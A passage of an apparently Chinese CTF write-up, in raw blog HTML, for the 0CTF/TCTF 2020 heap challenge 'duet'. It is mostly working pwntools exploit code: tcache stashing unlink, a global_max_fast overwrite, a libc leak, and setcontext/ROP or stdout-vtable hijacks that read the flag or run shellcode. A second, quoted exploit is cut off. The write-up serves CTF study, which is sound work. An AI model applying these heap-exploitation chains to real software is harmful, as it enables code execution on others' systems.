class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">ins = [<span class="string">&quot;琴&quot;</span>, <span class="string">&quot;瑟&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content=<span class="string">b&quot;a&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Instrument: &quot;</span>, ins[index])</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Duration: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Score: &quot;</span>, content.ljust(size, <span class="string">b&quot;\\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Instrument: &quot;</span>, ins[index])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Instrument: &quot;</span>, ins[index])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;合: &quot;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x1b0</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x98</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x1f0</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x240</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x2e0</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x240</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0xf0</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x1b0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x88</span>) <span class="comment"># padding</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x1b0</span> - <span class="number">0xa0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x1b0</span>) <span class="comment"># 0xa0 chunk in small bin</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x1f0</span>) <span class="comment"># 0x200 chunk to overlap</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x1b0</span>-<span class="number">0x90</span>) <span class="comment"># 0x90 chunk in unsorted bin and next is 0x200 chunk</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x1f0</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0xe8</span>+p64(<span class="number">0x200</span>-<span class="number">0xf0</span>+<span class="number">1</span>)) <span class="comment"># 0x200 chunk 2 fd is 0x200 chunk 1(overlap)</span></span><br><span class="line">edit(<span class="number">0xf1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x3f0</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x401</span>-<span class="number">0x50</span>)) <span class="comment"># 0x2f0 chunk to unsorted bin</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x240</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x1f8</span>+p64(<span class="number">0x201</span>)) <span class="comment"># 0xa0 chunk 1 in unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 0x200 chunk2 &lt;-&gt; 0xa0 chunk 1, 0x200 chunk2 + 0x50 is 0xa0 chunk 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;瑟: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x200</span>)</span><br><span class="line">heap_address = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">96</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">main_arena_address = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;heap address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">global_max_fast_address = libc.address + <span class="number">0x1e7600</span></span><br><span class="line">free_hook_address = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache stashing unlink attack</span></span><br><span class="line"><span class="comment"># change small bin fd and bk</span></span><br><span class="line">payload = <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0xa1</span>) + p64(heap_address - <span class="number">0x540</span>) + p64(global_max_fast_address - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x80</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xf0</span>, payload) <span class="comment"># 0xa0 to small bin, 0x100 chunk in unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 0x200 chunk2 in unsorted bin</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>)</span><br><span class="line">log.success(<span class="string">&quot;gloabl max fast has been changed&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 0xa0 chunk 1 to fast bin</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 0x250 chunk to fast bin, +0x200 chunk is 0x200 chunk 2</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x240</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x1f8</span> + p64(<span class="number">0xe1</span>)) <span class="comment"># 0x200 chunk2 changed to 0xe0 chunk(unsorted bin)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xd0</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x201</span>)) <span class="comment"># 0xa0 chunk1 change to 0x200 chunk</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x201</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x191</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x181</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x171</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x161</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x151</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x141</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x131</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x121</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x1f0</span>, payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x240</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x1f8</span> + p64(<span class="number">0x91</span>)) <span class="comment"># +0x200 is 0xa0 chunk, changed to 0x90 chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># 0x90 chunk to fast bin</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x240</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x1f8</span> + p64(<span class="number">0x91</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x48</span> + p64(<span class="number">0x81</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x240</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x1f8</span> + p64(<span class="number">0x111</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x240</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x1f8</span> + p64(<span class="number">0x111</span>) + p64(main_arena_address + <span class="number">64</span>))</span><br><span class="line">payload = <span class="string">b&#x27;\\x00&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0x201</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\\x00&#x27;</span>*<span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x161</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x151</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x141</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x131</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x240</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x1f8</span> + p64(<span class="number">0xe1</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">top_chunk = free_hook_address - <span class="number">0xb68</span> + <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x10</span> + p64(top_chunk) + <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0xc8</span> + p64(main_arena_address + <span class="number">304</span>) + p64(<span class="number">304</span>*<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, payload)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">304</span>*<span class="number">2</span>-<span class="number">0x10</span>, <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x18</span> + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pad = main_arena_address + <span class="number">0x60</span></span><br><span class="line">payload = p64(pad)*<span class="number">2</span> + p64(top_chunk) + p64(pad)*<span class="number">3</span> + p64(free_hook_address - <span class="number">0xb68</span> - <span class="number">1</span>) + p64(pad)*<span class="number">22</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x0000000000026542</span> + libc.address</span><br><span class="line">p_rdx_r = <span class="number">0x000000000012bda6</span> + libc.address</span><br><span class="line">p_rax_r = <span class="number">0x0000000000047cf8</span> + libc.address</span><br><span class="line">p_rsi_r = <span class="number">0x0000000000026f9e</span> + libc.address</span><br><span class="line">p_rsp_r = <span class="number">0x0000000000030e4e</span> + libc.address</span><br><span class="line">syscall_address = <span class="number">0x00000000000cf6c5</span> + libc.address</span><br><span class="line"></span><br><span class="line">flag = free_hook_address + <span class="number">8</span></span><br><span class="line">read_address = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_address = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext_address = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line"></span><br><span class="line">row = flat([</span><br><span class="line">    p_rdi_r,</span><br><span class="line">    flag,</span><br><span class="line">    p_rsi_r, <span class="number">0</span>,</span><br><span class="line">    p_rdx_r, <span class="number">4</span>,</span><br><span class="line">    p_rax_r, <span class="number">2</span>,</span><br><span class="line">    syscall_address,</span><br><span class="line">    p_rdi_r, <span class="number">3</span>,</span><br><span class="line">    p_rsi_r, heap_address,</span><br><span class="line">    p_rdx_r, <span class="number">0x20</span>,</span><br><span class="line">    read_address,</span><br><span class="line">    p_rdi_r, <span class="number">1</span>,</span><br><span class="line">    p_rsi_r, heap_address,</span><br><span class="line">    p_rdx_r, <span class="number">0x20</span>,</span><br><span class="line">    write_address</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *0x555555555BC7&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xf8</span>, <span class="string">b&quot;\\x00&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21001</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, p64(pad)*<span class="number">2</span> + p64(top_chunk) + p64(pad)*<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">target = free_hook_address - <span class="number">0x328</span></span><br><span class="line">rdx = target + <span class="number">0xe0</span> - <span class="number">0xa0</span> -<span class="number">0x8</span></span><br><span class="line">target_rsp = target + <span class="number">0xe0</span></span><br><span class="line">io_write_sync = libc.sym[<span class="string">&#x27;_IO_wfile_sync&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(rdx)*<span class="number">4</span> + <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x60</span> + p64(target + <span class="number">0xb0</span>)</span><br><span class="line">payload += p64(target) + p64(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x20</span> + p64(setcontext_address) +p64(target_rsp + <span class="number">8</span>)</span><br><span class="line">payload += row</span><br><span class="line">payload = payload.ljust(<span class="number">0x328</span>, <span class="string">b&quot;\\x00&quot;</span>) + p64(io_write_sync) + <span class="string">b&quot;./flag\\x00&quot;</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x400</span>, payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>第二种则是利用<code>stdout</code>的<code>flag</code>中的<code>0xfb</code>伪造<code>fast bin chunk</code>，从而分配<code>chunk</code>到<code>stdout</code>上。</p><blockquote><p>这里对size的检查是用的eax，也就是低4字节，前面的地址残余无影响</p></blockquote><p>将<code>stdout</code>的<code>vtable</code>改为<code>IO_wfile_jumps_mmap+40</code>，即将<code>__xsputn</code>函数指针指向<code>_IO_wfile_sync</code>，这样<code>puts</code>函数在进行输出的时候就会调用<code>_IO_wfile_sync</code>函数，该函数内通过<code>rdi</code>即<code>stdout</code>控制<code>r12</code>的值为<code>gadget</code>的地址，其作用如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx, qword ptr [rdi + <span class="number">8</span>] # &lt;&lt; +<span class="number">0x12be97</span></span><br><span class="line">mov    rax, qword ptr [rdi]</span><br><span class="line">mov    rdi, rdx</span><br><span class="line">jmp    rax</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就可以继续劫持控制流到<code>setcontext</code>，并且将<code>rdx</code>设置为参数。最终调用<code>mprotect</code>关闭不可执行保护执行<code>shellcode</code>。</p><p>贴出大佬的<a href="https://balsn.tw/ctf_writeup/20200627-0ctf_tctf2020quals/#duet">WP</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">host = <span class="string">&#x27;pwnable.org&#x27;</span></span><br><span class="line">port = <span class="number">12356</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./duet&quot;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">  log.success(<span class="string">&quot;libc load success&quot;</span>)</span><br><span class="line">  system_off = libc.symbols.system</span><br><span class="line">  log.success(<span class="string">&quot;system_off = &quot;</span>+<span class="built_in">hex</span>(system_off))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  log.failure(<span class="string">&quot;libc not found !&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index,data</span>):</span><br><span class="line">  r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">  r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Instrument: &quot;</span>)</span><br><span class="line">  r.sendline(index)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Duration: &quot;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">  r.recvuntil(<span class="string">&quot;Score: &quot;</span>)</span><br><span class="line">  r.send(data)</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">  r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">  r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">  r.sendline(index)</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">  r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">  r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">  r.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heap</span>(<span class="params">b</span>):</span><br><span class="line">  r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">  r.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">  r.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">  r.sendline(<span class="built_in">str</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">  r = process([binary, <span class="string">&quot;0&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  r = remote(host ,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  fuck = &#123;<span class="number">0</span>: <span class="string">&quot;琴&quot;</span>,<span class="number">1</span>:<span class="string">&quot;瑟&quot;</span>&#125;</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line">    remove(fuck[<span class="number">0</span>])</span><br><span class="line">    new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0xe0</span>)</span><br><span class="line">    remove(fuck[<span class="number">0</span>])</span><br><span class="line">    new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line">    remove(fuck[<span class="number">0</span>])</span><br><span class="line">    new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x1e0</span>)</span><br><span class="line">    remove(fuck[<span class="number">0</span>])</span><br><span class="line">    new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x140</span>)</span><br><span class="line">    remove(fuck[<span class="number">0</span>])</span><br><span class="line">  new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x88</span>)</span><br><span class="line">  new(fuck[<span class="number">1</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0xf0</span>)</span><br><span class="line">  remove(fuck[<span class="number">0</span>])</span><br><span class="line">  heap(<span class="number">0xf1</span>)</span><br><span class="line">  new(fuck[<span class="number">0</span>],p64(<span class="number">0x81</span>)*<span class="number">60</span>)</span><br><span class="line">  remove(fuck[<span class="number">1</span>])</span><br><span class="line">  new(fuck[<span class="number">1</span>],p64(<span class="number">0x21</span>)*<span class="number">96</span>)</span><br><span class="line">  remove(fuck[<span class="number">1</span>])</span><br><span class="line">  new(fuck[<span class="number">1</span>],p64(<span class="number">0x91</span>)*<span class="number">31</span> + p64(<span class="number">0x91</span>) + <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x88</span> + p64(<span class="number">0x21</span>)*<span class="number">11</span>)</span><br><span class="line">  remove(fuck[<span class="number">0</span>])</span><br><span class="line">  show(fuck[<span class="number">1</span>])</span><br><span class="line">  r.recv(<span class="number">0x105</span>)</span><br><span class="line">  libc = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\\x00&quot;</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;libc = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc)))</span><br><span class="line">  new(fuck[<span class="number">0</span>],p64(<span class="number">0x21</span>)*<span class="number">60</span>)</span><br><span class="line">  remove(fuck[<span class="number">0</span>])</span><br><span class="line">  remove(fuck[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">  new(fuck[<span class="number">0</span>],p64(<span class="number">0x21</span>)*<span class="number">128</span>)</span><br><span class="line">  remove(fuck[<span class="number">0</span>])</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    remove(fuck[<span class="number">0</span>])</span><br><span 